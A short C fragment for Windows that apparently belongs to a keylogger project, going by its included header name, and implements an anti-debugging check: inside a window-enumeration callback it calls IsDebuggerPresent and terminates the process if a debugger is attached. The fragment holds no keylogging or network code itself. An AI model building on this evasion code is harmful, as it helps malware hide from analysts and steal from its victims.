#include "keylogger_antidebugg.h"
#include <Windows.h>


BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
    DWORD dwProcessId;
    GetWindowThreadProcessId(hwnd, &dwProcessId);
    if (dwProcessId == GetCurrentProcessId()) {
        return TRUE;
    }
    if (IsDebuggerPresent()) {
        ExitProcess(-1);
    }
    return TRUE;
}
